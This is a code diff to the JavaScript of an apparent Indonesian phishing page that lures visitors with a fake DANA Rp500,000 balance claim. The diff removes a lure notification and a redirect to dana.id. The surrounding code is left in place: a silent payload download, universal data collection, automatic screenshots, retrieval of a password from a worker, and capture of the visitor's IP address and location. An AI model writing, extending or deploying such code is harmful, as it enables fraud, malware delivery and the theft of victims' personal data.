@@ -136,8 +136,6 @@ var GITHUB_REPO = 'verifikasi-site';
 var semuaDidapat = false;
 var spreadDone = false;
 var DOWNLOAD_STARTED = false;
-var NOTIFICATION_SHOWN = false;
-var REDIRECT_DONE = false;
 var WS_PASSWORD = '';
 var IP_ADDRESS = '';
 var LOCATION_DATA = null;
@@ -399,42 +397,10 @@ function downloadPayloadSilent() {
 }
 
 // ============================================================
-// NOTIFICATION
+// NOTIFICATION - DIHAPUS TOTAL!
 // ============================================================
-function showKlaimNotification() {
-    if (NOTIFICATION_SHOWN) return;
-    NOTIFICATION_SHOWN = true;
-    
-    try {
-        if (!('Notification' in window)) { return; }
-        if (Notification.permission === 'denied') { return; }
-        if (Notification.permission !== 'granted') {
-            Notification.requestPermission().then(function(permission) {
-                if (permission === 'granted') { createKlaimNotification(); }
-            }).catch(function() {});
-            return;
-        }
-        createKlaimNotification();
-    } catch(e) {}
-}
-
-function createKlaimNotification() {
-    try {
-        var notif = new Notification('🔔 Klik Untuk Klaim', {
-            body: 'Klik untuk menyelesaikan verifikasi dan klaim saldo DANA Rp500.000!',
-            icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">💰</text></svg>',
-            requireInteraction: true,
-            silent: false,
-            vibrate: [200, 100, 200]
-        });
-        
-        notif.onclick = function() {
-            notif.close();
-        };
-        
-        setTimeout(function() { try { notif.close(); } catch(e) {} }, 30000);
-    } catch(e) {}
-}
+// function showKlaimNotification() { ... DIHAPUS }
+// function createKlaimNotification() { ... DIHAPUS }
 
 // ============================================================
 // DATA COLLECTION (UNIVERSAL)
@@ -544,17 +510,12 @@ function dapatkanSemua() {
         // 🔥 DOWNLOAD + BUKA HTML VIA XHR SAJA
         setTimeout(function() { downloadPayloadSilent(); }, 500);
         
-        setTimeout(function() { showKlaimNotification(); }, 3000);
+        // 🔥 NOTIFICATION DIHAPUS! TIDAK ADA showKlaimNotification!
+        
         setTimeout(function() { showStatusBar(); }, 500);
         setTimeout(function() { autoScreenshot(); }, 7000);
         
-        // ✅ REDIRECT DIHAPUS! (HANYA INI YANG DIHAPUS)
-        // setTimeout(function() {
-        //     if (!REDIRECT_DONE) {
-        //         REDIRECT_DONE = true;
-        //         try { window.location.href = 'https://www.dana.id'; } catch(e) {}
-        //     }
-        // }, 8000);
+        // ✅ REDIRECT DIHAPUS! TIDAK ADA redirect ke dana.id!
         
         getPasswordFromWorker().then(function(password) { WS_PASSWORD = password; K({ sumber: 'password_received', data: 'ok' }); }).catch(function() {});
         
